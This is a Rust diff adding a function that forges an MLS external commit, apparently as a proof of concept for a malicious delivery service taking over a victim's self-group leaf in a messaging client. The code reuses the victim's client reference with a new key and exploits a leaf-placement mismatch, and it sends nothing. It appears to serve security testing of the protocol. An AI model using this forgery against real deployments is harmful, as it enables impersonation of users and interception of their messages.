@@ -823,4 +823,148 @@ impl CoreUser {
                 .await?;
         Ok(keys.into_iter().map(|(record, _)| record.hash).collect())
     }
+
+    /// Builds the external commit a malicious DS could forge from the group info and the ear key it
+    /// holds. The commit gives a new leaf the self-group credential and the QS client reference of
+    /// the sibling `victim` with a fresh signature key, removes the victim's leaf in both legs and
+    /// carries `aad`. Nothing is sent to the DS. Returns the serialized commit.
+    ///
+    /// OpenMLS places the new leaf at the leftmost blank leaf, while receivers place it at the
+    /// removed leaf if that is further left. So the self group needs a blank leaf left of the
+    /// victim's.
+    pub async fn forge_self_group_leaf_takeover(
+        &self,
+        victim: Uuid,
+        aad: aircommon::messages::client_ds::AadPayload,
+    ) -> anyhow::Result<Vec<u8>> {
+        use aircommon::{
+            credentials::LeafCredential,
+            messages::client_ds::AadMessage,
+            mls_group_config::{
+                QS_CLIENT_REFERENCE_EXTENSION_TYPE, default_mls_group_join_config,
+                self_group_leaf_node_capabilities,
+            },
+        };
+        use airprotos::client::app_data::ClientAppData;
+        use anyhow::{Context, ensure};
+        use apqmls::{
+            authentication::ApqCredentialWithKey,
+            external_commit_builder::ApqExternalCommitBuilder,
+            messages::{ApqRatchetTreeIn, VerifiableApqGroupInfo},
+        };
+        use openmls::prelude::{
+            Credential, CredentialType, CredentialWithKey, Extension, LeafNodeParameters, Proposal,
+            RemoveProposal, tls_codec::Serialize as _,
+        };
+        use openmls_rust_crypto::OpenMlsRustCrypto;
+        use tls_codec::DeserializeBytes as _;
+
+        let mut read = self.db().read().await?;
+        let group_id = OwnClientInfo::load(&mut read)
+            .await?
+            .self_group_id
+            .context("no self group")?;
+        let group = Group::load(read, &group_id)
+            .await?
+            .context("self group not persisted")?;
+        let victim_index = group
+            .mls_group()
+            .members()
+            .find(|member| {
+                matches!(
+                    LeafCredential::from_credential(&member.credential),
+                    Ok(LeafCredential::SelfGroup(credential)) if credential.client_id() == victim
+                )
+            })
+            .context("victim not in the self group")?
+            .index;
+        let occupied: HashSet<u32> = group
+            .mls_group()
+            .members()
+            .map(|member| member.index.u32())
+            .collect();
+        let leftmost_blank = (0..).find(|index| !occupied.contains(index)).unwrap_or(0);
+        ensure!(
+            leftmost_blank < victim_index.u32(),
+            "the self group needs a blank leaf left of the victim's leaf"
+        );
+
+        let qgid: QualifiedGroupId = group_id.clone().try_into()?;
+        let pq_group_id = group
+            .pq()
+            .context("self group without a PQ leg")?
+            .mls_group
+            .group_id()
+            .clone();
+        let info = self
+            .api_clients()
+            .get(qgid.owning_domain())?
+            .ds_external_commit_info(group_id, Some(pq_group_id), group.group_state_ear_key())
+            .await?;
+        let pq_info = info.pq.context("external commit info without a PQ leg")?;
+
+        let client_reference = info
+            .ratchet_tree_in
+            .full_leaves()
+            .find(|(index, _)| *index == victim_index)
+            .context("victim leaf not in the ratchet tree")?
+            .1
+            .clone()
+            .into_unchecked()
+            .extensions()
+            .unknown(QS_CLIENT_REFERENCE_EXTENSION_TYPE)
+            .context("victim leaf without a QS client reference")?
+            .clone();
+        let mut leaf_node_extensions = ClientAppData::current().leaf_node_extensions();
+        leaf_node_extensions.add(Extension::Unknown(
+            QS_CLIENT_REFERENCE_EXTENSION_TYPE,
+            client_reference,
+        ))?;
+        let leaf_node_parameters = LeafNodeParameters::builder()
+            .with_capabilities(self_group_leaf_node_capabilities())
+            .with_extensions(leaf_node_extensions)
+            .build();
+
+        let signer = LeafSigningKey::SelfGroup(SelfGroupSigningKey::generate(victim)?);
+        let signature_key = signer.verifying_key().clone();
+        let credential_with_key = ApqCredentialWithKey {
+            t_credential: CredentialWithKey {
+                credential: signer.mls_credential()?,
+                signature_key: signature_key.clone().into(),
+            },
+            pq_credential: CredentialWithKey {
+                credential: Credential::new(CredentialType::Basic, Vec::new()),
+                signature_key: signature_key.into(),
+            },
+        };
+        // `RemoveProposal` has no public constructor; its encoding is the removed leaf index.
+        let removed = victim_index.u32().to_be_bytes();
+        let remove = || -> anyhow::Result<Proposal> {
+            let proposal = RemoveProposal::tls_deserialize_exact_bytes(&removed)?;
+            Ok(Proposal::Remove(Box::new(proposal)))
+        };
+
+        let provider = OpenMlsRustCrypto::default();
+        let (_group, bundle) = ApqExternalCommitBuilder::new()
+            .with_ratchet_tree(ApqRatchetTreeIn::new(
+                info.ratchet_tree_in,
+                pq_info.ratchet_tree,
+            ))
+            .with_aad(AadMessage::from(aad).tls_serialize_detached()?)
+            .with_config(default_mls_group_join_config())
+            .skip_lifetime_validation()
+            .leaf_node_parameters(leaf_node_parameters.clone(), leaf_node_parameters)
+            .create_group_info(true)
+            .emulation_group(true)
+            .add_t_proposal(remove()?)
+            .add_pq_proposal(remove()?)
+            .build(
+                &provider,
+                &signer,
+                credential_with_key,
+                VerifiableApqGroupInfo::new(info.verifiable_group_info, pq_info.group_info),
+                |_, _| true,
+            )?;
+        Ok(bundle.into_message_out().tls_serialize_detached()?)
+    }
 }
